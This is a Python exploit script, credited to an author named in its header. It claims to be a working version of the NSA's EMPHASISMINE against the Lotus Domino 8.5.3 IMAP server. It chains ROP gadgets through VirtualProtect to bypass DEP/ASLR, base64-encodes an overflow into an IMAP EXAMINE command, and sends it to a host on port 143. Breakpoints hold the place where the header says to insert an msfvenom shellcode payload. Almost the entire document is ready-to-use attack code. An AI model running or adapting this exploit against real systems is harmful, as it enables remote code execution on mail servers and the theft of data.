
##########################################################
#							  #
# Here is a working version of the NSA's EMPHASISMINE     #
# for IMAP Server Lotus Domino 8.5.3 FP0		  #
#        DEP/ASLR bypass				  #
#							  #
# Replace breakpoints with msfvenom payload   		  #
#	(ALPHANUMERIC)					  #
# I love you Alison Thompson OAM @ThirdWaveORG            #
# Author: Charles Truscott @r0ss1n1			  #
#							  #
###########################################################


import base64
import struct
import socket
import time

rop_and_roll = struct.pack('<I', 0x00433212)  # POP ECX # RETN [nIMAP.EXE]
rop_and_roll += struct.pack('<I', 0x41414141)  # Filler
rop_and_roll += struct.pack('<I', 0x7c37a140)  # ptr to &VirtualProtect() [IAT MSVCR71.dll]
rop_and_roll += struct.pack('<I', 0x60609925)  # MOV EAX,DWORD PTR DS:[ECX] # RETN [nnotes.dll]
rop_and_roll += struct.pack('<I', 0x60b79a61)  # XCHG EAX,ESI # RETN [nnotes.dll]
rop_and_roll += struct.pack('<I', 0x62450fc4)  # POP EBP # RETN [NLSCCSTR.DLL]
rop_and_roll += struct.pack('<I', 0x7c345c30)  # & push esp # ret  [MSVCR71.dll]
rop_and_roll += struct.pack('<I', 0x60165ba9)  # POP EBX # RETN [nnotes.dll]
rop_and_roll += struct.pack('<I', 0x00000001)  # 0x00000001-> ebx
rop_and_roll += struct.pack('<I', 0x6020962e)  # POP EDX # RETN [nnotes.dll]
rop_and_roll += struct.pack('<I', 0x00001000)  # 0x00001000-> edx
rop_and_roll += struct.pack('<I', 0x60e81a98)  # POP ECX # RETN [nnotes.dll]
rop_and_roll += struct.pack('<I', 0x00000040)  # 0x00000040-> ecx
rop_and_roll += struct.pack('<I', 0x606609f9)  # POP EDI # RETN [nnotes.dll]
rop_and_roll += struct.pack('<I', 0x62136802)  # RETN (ROP NOP) [nxmlproc.dll]
rop_and_roll += struct.pack('<I', 0x0042ba51)  # POP EAX # RETN [nIMAP.EXE]
rop_and_roll += struct.pack('<I', 0x90909090)  # nop
rop_and_roll += struct.pack('<I', 0x60505637)  # PUSHAD # RETN [nnotes.dll]


username = "user"

password = "pass"

login=". LOGIN " + " " +  '"' + username + '"' +  " " + '"' +  password + '"' +  "\r\n"


payload = "\x90" * 556 + rop_and_roll + "\x90" * 20 + "\xCC" * (1500 - 556 - len(rop_and_roll) - 20)
encoded = base64.b64encode(payload)

crash = ". EXAMINE " + "&" + encoded + "\x0d\x0a"

print crash
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(('172.16.65.128', 143))
time.sleep(3)
connectionresponse = expl.recv(1024)
print str(connectionresponse)
print "sending LOGIN request"
expl.send(login)
loginresponse = expl.recv(1024)
print str(loginresponse)
print "sending EXAMINE request"
print crash
expl.send(crash)
crashresponse = expl.recv(1024)
print str(crashresponse)
expl.close
